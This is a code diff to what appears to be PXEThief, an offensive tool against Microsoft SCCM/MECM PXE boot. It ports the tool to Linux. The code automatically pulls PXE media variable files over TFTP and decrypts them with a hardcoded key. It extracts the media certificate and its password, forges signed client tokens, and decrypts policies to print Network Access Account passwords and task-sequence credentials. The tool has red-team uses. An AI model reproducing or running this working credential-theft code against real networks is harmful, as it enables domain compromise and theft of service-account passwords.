@@ -24,8 +24,12 @@ import zlib
 import datetime
 from os import walk,system
 from ipaddress import IPv4Network,IPv4Address
-if platform.system().lower().startswith('win'):
-    import win32crypt
+from certipy.lib.certificate import load_pfx
+from sccmwtf import SCCMTools, Tools, CryptoTools, policyBody, msgHeaderPolicy, msgHeader, dateFormat1
+from cryptography.hazmat.primitives.asymmetric import padding
+import tftpy
+from asn1crypto import cms
+import hexdump
 
 #Scapy global variables
 osName = platform.system()
@@ -152,7 +156,7 @@ def configure_scapy_networking(ip_address):
     global clientMacAddress
 
     clientIPAddress = get_if_addr(conf.iface)
-    fam,clientMacAddress = get_if_raw_hwaddr(conf.iface)
+    clientMacAddress = get_if_raw_addr(conf.iface)
 
     bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
     bind_layers(UDP,BOOTP,dport=68,sport=4011)
@@ -237,7 +241,6 @@ def get_variable_file_path(tftp_server):
             elif packet_type == 2:
                 #Skip first two bytes of option and copy the encrypted data by data_length
                 encrypted_key = variables_file[2:2+data_length]
-                
                 #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                 string_length_index = 2 + data_length + 1
                 beginning_of_string_index = 2 + data_length + 2
@@ -311,17 +314,20 @@ def get_pxe_files(ip):
         "quit\n" +
         "_EOF_\n" )
         '''
+    tftp_client = tftpy.TftpClient(tftp_server_ip, 69)
+    tftp_client.download(variables_file, variables_file.split("\\")[-1])
+    tftp_client.download(bcd_file, bcd_file.split("\\")[-1])
 
-    print("[+] Use this command to grab the files: ")
-    print(tftp_download_string)
+
+#    print("[+] Use this command to grab the files: ")
+#    print(tftp_download_string)
     if BLANK_PASSWORDS_FOUND:
             config = configparser.ConfigParser(allow_no_value=True)
             config.read('settings.ini')
             general_config = config["GENERAL SETTINGS"]
             auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
             if auto_exploit_blank_password:
-                print("[!] Attempting automatic exploitation. Note that this will require the default tftp client to be installed (on Windows, this can be found under Windows Features), and this will be run with os.system")
-                os.system(var_file_download_cmd)
+                print("[!] Attempting automatic exploitation.")
                 use_encrypted_key(encrypted_key,var_file_name)
             else:
                 print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
@@ -348,6 +354,43 @@ def generateClientTokenSignature(data,cryptoProv):
     out = sha256hash.CryptSignHash(1,1)
 
     return binascii.hexlify(out).decode()
+
+def generateSignedDataLinux(data,key):
+    from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
+    from cryptography.hazmat.primitives import hashes
+    signature = key.sign(data, PKCS1v15(), hashes.SHA1())
+    signature_rev = bytearray(signature)
+    signature_rev.reverse()
+    return bytes(signature_rev)
+
+def CryptDecryptMessage(pfx, data):
+    info = cms.ContentInfo.load(data)
+    digested_data = info['content']
+    key_algo = digested_data['recipient_infos'].native[0]['key_encryption_algorithm']['algorithm']
+    key = b""
+    if key_algo == 'rsaes_pkcs1v15':
+        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
+        key = pfx.decrypt(session_key, padding.PKCS1v15())
+    elif key_algo == 'rsaes_oaep':
+        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
+        pad = padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None)
+        key = pfx.decrypt(session_key, pad)
+    else:
+        print(f"{key_algo} not implemented yet")
+
+    iv = digested_data['encrypted_content_info']['content_encryption_algorithm']['parameters'].native
+    ciphertext = digested_data['encrypted_content_info']['encrypted_content'].native
+    decrypted_data = b""
+    enc_algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
+    if enc_algo == 'tripledes_3key':
+        #algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
+        #print(f"{algo} not implemented yet")
+        decrypted_data = media_crypto._3des_decrypt_raw(ciphertext, key, iv)
+    elif enc_algo == 'aes256_cbc':
+        decrypted_data = media_crypto.aes256_decrypt_raw(ciphertext, key, iv)
+    else:
+        print(f"{enc_algo} not implemented yet")
+    return decrypted_data
 
 def deobfuscate_credential_string(credential_string):
     #print(credential_string)
@@ -438,9 +481,11 @@ def use_encrypted_key(encrypted_key, media_file_path):
     length = encrypted_key[0]
     encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
     encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
+
     key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
 
     key = media_crypto.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
+
     var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
     
     #Perform bit extension
@@ -466,11 +511,8 @@ def use_encrypted_key(encrypted_key, media_file_path):
     
     print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
     write_to_binary_file(filename,smsTSMediaPFX)
-    
-    if osName == "Windows":
-        process_pxe_bootable_and_prestaged_media(media_variables)
-    else:
-        print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")
+
+    process_pxe_bootable_and_prestaged_media(media_variables)
 
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
@@ -480,17 +522,7 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     CCMClientID = smsMediaGuid
     smsTSMediaPFX = binascii.unhexlify(cert_bytes)
     
-    #Import decrypted PFX and initialise Windows Crypto functions
-    certStore = win32crypt.PFXImportCertStore(smsTSMediaPFX,smsMediaGuid[:31],4096) #CRYPT_USER_KEYSET
-    certEnum = certStore.CertEnumCertificatesInStore()
-    certKeyContext = certEnum[0].CertGetCertificateContextProperty(2)
-
-    cryptoProv = win32crypt.CryptAcquireContext(certKeyContext["ContainerName"],certKeyContext["ProvName"],certKeyContext["ProvType"],0)
-    print('[+] Successfully Imported PFX File into Windows Certificate Store!')
-
-    decryptPara = {}
-    decryptPara["CertStores"]=[certStore]
-
+    key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
@@ -525,7 +557,7 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
             print(e)
     
     try:
-        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature)
+        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key)
     except Exception as e:
         print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm")
         print()
@@ -552,7 +584,7 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
             wf_dstr = colsetting.content.decode("utf-16-le")
         else:        
 
-            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,colsetting.content)
+            dstr = CryptDecryptMessage(key,colsetting.content)
             dstr = dstr.decode("utf-16-le")
             wf_dstr = "".join(c for c in dstr if c.isprintable())
             #print(wf_dstr)
@@ -580,7 +612,7 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
         if USING_TLS:
             dstr = naaConfig.content.decode("utf-16-le")
         else:
-            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,naaConfig.content)
+            dstr = CryptDecryptMessage(key,naaConfig.content)
             dstr = dstr.decode("utf-16-le")
         
         wf_dstr = "".join(c for c in dstr if c.isprintable())
@@ -593,22 +625,17 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
         if USING_TLS:
             dstr = tsConfig.content.decode("utf-16-le")
         else:
-            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,tsConfig.content)
+            dstr = CryptDecryptMessage(key,tsConfig.content)
             dstr = dstr.decode("utf-16-le")
 
         wf_dstr = "".join(c for c in dstr if c.isprintable())
         tsSequence = process_task_sequence_xml(wf_dstr)
     
-    #Clean up code
-    print("[+] Cleaning up")
-    win32crypt.CryptAcquireContext(certKeyContext["ContainerName"],certKeyContext["ProvName"],certKeyContext["ProvType"],16)
-    cryptoProv.CryptReleaseContext()
-    certStore.CertCloseStore()
 
 def process_naa_xml(naa_xml):
     
     print("[+] Extracting password from Decrypted Network Access Account Configuration\n")
-    root = ET.fromstring(naa_xml)
+    root = ET.fromstring(naa_xml[:naa_xml.rfind('>')+1])
     network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")
 
     for naa_settings in network_access_account_xml:
@@ -622,7 +649,7 @@ def process_naa_xml(naa_xml):
         print("[!] Network Access Account Password: '" + network_access_password+"'")
 
 def process_task_sequence_xml(ts_xml):
-    root = ET.fromstring(ts_xml)
+    root = ET.fromstring(ts_xml[:ts_xml.rfind('>')+1])
 
     pkg_name = root.xpath("//*[@name='PKG_Name']/value")[0].text 
     adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[0].text
@@ -711,7 +738,7 @@ def analyse_task_sequence_for_potential_creds(ts_xml):
         #print("[!] Look through it for credentials by searching for tags and properties with the words 'Account', 'Username', 'Password'")
 
 #Retrieve all available TSs, the NAA config and any identified collection settings and return to parsing function
-def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature):
+def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key):
 
     #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     #print("[+] Retrieving Needed Metadata from SCCM Server...")
@@ -781,8 +808,15 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
 
     print("[+] " + str(len(allPoliciesURLs)) + " policy assignment URLs found!")
 
-    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature" : CCMClientIDSignature, "CCMClientTimestamp" : CCMClientTimestamp, "CCMClientTimestampSignature" : CCMClientTimestampSignature}
-    
+#    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature" : CCMClientIDSignature, "CCMClientTimestamp" : CCMClientTimestamp, "CCMClientTimestampSignature" : CCMClientTimestampSignature}
+    now = datetime.datetime.now(datetime.UTC)
+    headers = {"Connection": "close","User-Agent": "ConfigMgr Messaging HTTP Sender"}
+    headers["ClientToken"] = "{};{}".format(
+            CCMClientID.upper(),
+            now.strftime(dateFormat1)
+          )
+    headers["ClientTokenSignature"] = CryptoTools.signNoHash(key, "{};{}".format(CCMClientID.upper(), now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+       
     if DUMP_POLICIES: 
         POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")
         #Dump all config XMLs to disk - Uncomment to write to policies/*.xml
@@ -907,10 +941,7 @@ if __name__ == "__main__":
         print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
         write_to_binary_file(filename,smsTSMediaPFX)
     
-        if osName == "Windows":
-            process_pxe_bootable_and_prestaged_media(media_variables)
-        else:
-            print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")
+        process_pxe_bootable_and_prestaged_media(media_variables)
 
     elif int(sys.argv[1]) == 4:
         print("[+] Attempting to decrypt encrypted media variables file and policy from stand-alone media...")
